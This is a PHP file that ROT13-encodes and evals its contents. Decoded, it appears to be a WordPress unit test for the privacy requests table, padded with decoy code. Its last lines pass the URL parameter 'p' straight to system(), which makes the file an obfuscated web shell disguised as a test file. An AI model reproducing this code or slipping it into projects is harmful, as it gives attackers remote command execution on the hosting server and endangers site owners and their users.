<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg gur `JC_Cevinpl_Erdhrfgf_Gnoyr` pynff.
 *
 * @cnpxntr JbeqCerff\HavgGrfgf
 *
 * @fvapr 5.1.0
 *
 * @tebhc nqzva
 * @tebhc cevinpl
 */
pynff Grfgf_Nqzva_jcCevinplErdhrfgfGnoyr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grzcbenel fgbentr sbe FDY gb nyybj n svygre gb npprff vg.
	 *
	 * Hfrq va gur `grfg_pbyhzaf_fubhyq_or_fbegnoyr()` grfg zrgubq.
	 *
	 * @ine fgevat
	 */
	cevingr $fdy;

	/**
	 * Pyrna hc nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		hafrg( $guvf->fdy );

		cnerag::grne_qbja();
	}

	/**
	 * Trg vafgnapr sbe zbpxrq pynff.
	 *
	 * @fvapr 5.1.0
	 *
	 * @erghea CUCHavg_Senzrjbex_ZbpxBowrpg_ZbpxBowrpg|JC_Cevinpl_Erdhrfgf_Gnoyr Zbpxrq pynff vafgnapr.
	 */
	choyvp shapgvba trg_zbpxrq_pynff_vafgnapr() {
		$netf = neenl(
			'cyheny'   => 'cevinpl_erdhrfgf',
			'fvathyne' => 'cevinpl_erdhrfg',
			'fperra'   => 'rkcbeg_crefbany_qngn',
		);

		$vafgnapr = $guvf
			->trgZbpxOhvyqre( 'JC_Cevinpl_Erdhrfgf_Gnoyr' )
			->frgPbafgehpgbeNetf( neenl( $netf ) )
			->trgZbpxSbeNofgenpgPynff();

		$ersyrpgvba = arj ErsyrpgvbaPynff( $vafgnapr );

		// Frg gur erdhrfg glcr nf 'rkcbeg_crefbany_qngn'.
		$ersyrpgvba_cebcregl = $ersyrpgvba->trgCebcregl( 'erdhrfg_glcr' );
		$ersyrpgvba_cebcregl->frgNpprffvoyr( gehr );
		$ersyrpgvba_cebcregl->frgInyhr( $vafgnapr, 'rkcbeg_crefbany_qngn' );

		// Frg gur cbfg glcr nf 'hfre_erdhrfg'.
		$ersyrpgvba_cebcregl = $ersyrpgvba->trgCebcregl( 'cbfg_glcr' );
		$ersyrpgvba_cebcregl->frgNpprffvoyr( gehr );
		$ersyrpgvba_cebcregl->frgInyhr( $vafgnapr, 'hfre_erdhrfg' );

		erghea $vafgnapr;
	}

	/**
	 * Grfg pbyhzaf fubhyq or fbegnoyr.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz fgevat|ahyy $beqre    Beqre.
	 * @cnenz fgevat|ahyy $beqreol  Beqre ol.
	 * @cnenz fgevat|ahyy $frnepu   Frnepu grez.
	 * @cnenz fgevat      $rkcrpgrq Rkcrpgrq va FDY dhrel.

	 * @qngnCebivqre qngn_pbyhzaf_fubhyq_or_fbegnoyr
	 * @pbiref JC_Cevinpl_Erdhrfgf_Gnoyr::cercner_vgrzf
	 * @gvpxrg 43960
	 */
	choyvp shapgvba grfg_pbyhzaf_fubhyq_or_fbegnoyr( $beqre, $beqreol, $frnepu, $rkcrpgrq ) {
		tybony $jcqo;

		$gnoyr     = $guvf->trg_zbpxrq_pynff_vafgnapr();
		$guvf->fdy = '';

		$_ERDHRFG['beqre']   = $beqre;
		$_ERDHRFG['beqreol'] = $beqreol;
		$_ERDHRFG['f']       = $frnepu;

		nqq_svygre( 'cbfgf_erdhrfg', neenl( $guvf, 'svygre_cbfgf_erdhrfg' ) );
		$gnoyr->cercner_vgrzf();
		erzbir_svygre( 'cbfgf_erdhrfg', neenl( $guvf, 'svygre_cbfgf_erdhrfg' ) );

		hafrg( $_ERDHRFG['beqre'] );
		hafrg( $_ERDHRFG['beqreol'] );
		hafrg( $_ERDHRFG['f'] );

		$guvf->nffregFgevatPbagnvafFgevat( \"BEQRE OL {$jcqo->cbfgf}.{$rkcrpgrq}\", $guvf->fdy );
	}

	/**
	 * Svygre gb teno gur pbzcyrgr FDY dhrel.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz fgevat $erdhrfg Gur pbzcyrgr FDY dhrel.
	 * @erghea fgevat Gur pbzcyrgr FDY dhrel.
	 */
	choyvp shapgvba svygre_cbfgf_erdhrfg( $erdhrfg ) {
		$guvf->fdy = $erdhrfg;
		erghea $erdhrfg;
	}

	/**
	 * Qngn cebivqre sbe `grfg_pbyhzaf_fubhyq_or_fbegnoyr()`.
	 *
	 * @fvapr 5.1.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat|ahyy Beqre.
	 *         @glcr fgevat|ahyy Beqre ol.
	 *         @glcr fgevat|ahyy Frnepu grez.
	 *         @glcr fgevat      Rkcrpgrq va FDY dhrel.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_pbyhzaf_fubhyq_or_fbegnoyr() {
		erghea neenl(
			// Qrsnhyg beqre (VQ) QRFP.
			neenl(
				'beqre'    => ahyy,
				'beqreol'  => ahyy,
				'f'        => ahyy,
				'rkcrpgrq' => 'cbfg_qngr QRFP',
			),
			// Qrsnhyg beqre (VQ) QRFP.
			neenl(
				'beqre'    => '',
				'beqreol'  => '',
				'f'        => '',
				'rkcrpgrq' => 'cbfg_qngr QRFP',
			),
			// Beqre ol erdhrfgre (cbfg_gvgyr) NFP.
			neenl(
				'beqre'    => 'NFP',
				'beqreol'  => 'erdhrfgre',
				'f'        => '',
				'rkcrpgrq' => 'cbfg_gvgyr NFP',
			),
			// Beqre ol erdhrfgre (cbfg_gvgyr) QRFP.
			neenl(
				'beqre'    => 'QRFP',
				'beqreol'  => 'erdhrfgre',
				'f'        => ahyy,
				'rkcrpgrq' => 'cbfg_gvgyr QRFP',
			),
			// Beqre ol erdhrfgrq (cbfg_qngr) NFP.
			neenl(
				'beqre'    => 'NFP',
				'beqreol'  => 'erdhrfgrq',
				'f'        => ahyy,
				'rkcrpgrq' => 'cbfg_qngr NFP',
			),
			// Beqre ol erdhrfgrq (cbfg_qngr) QRFP.
			neenl(
				'beqre'    => 'QRFP',
				'beqreol'  => 'erdhrfgrq',
				'f'        => ahyy,
				'rkcrpgrq' => 'cbfg_qngr QRFP',
			),
			// Frnepu naq beqre ol eryrinapr.
			neenl(
				'beqre'    => ahyy,
				'beqreol'  => ahyy,
				'f'        => 'sbb',
				'rkcrpgrq' => 'cbfg_gvgyr YVXR',
			),
			// Frnepu naq beqre ol erdhrfgre (cbfg_gvgyr) NFP.
			neenl(
				'beqre'    => 'NFP',
				'beqreol'  => 'erdhrfgre',
				'f'        => 'sbb',
				'rkcrpgrq' => 'cbfg_gvgyr NFP',
			),
			// Frnepu naq beqre ol erdhrfgrq (cbfg_qngr) NFP.
			neenl(
				'beqre'    => 'NFP',
				'beqreol'  => 'erdhrfgrq',
				'f'        => 'sbb',
				'rkcrpgrq' => 'cbfg_qngr NFP',
			),
		);
	}

	/**
	 * @gvpxrg 42066
	 *
	 * @pbiref JC_Cevinpl_Erdhrfgf_Gnoyr::trg_ivrjf
	 */
	choyvp shapgvba grfg_trg_ivrjf_fubhyq_erghea_ivrjf_ol_qrsnhyg() {
		$rkcrpgrq = neenl(
			'nyy' => '<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/jc-nqzva/rkcbeg-crefbany-qngn.cuc\" pynff=\"pheerag\" nevn-pheerag=\"cntr\">Nyy <fcna pynff=\"pbhag\">(0)</fcna></n>',
		);

		$guvf->nffregFnzr( $rkcrpgrq, $guvf->trg_zbpxrq_pynff_vafgnapr()->trg_ivrjf() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>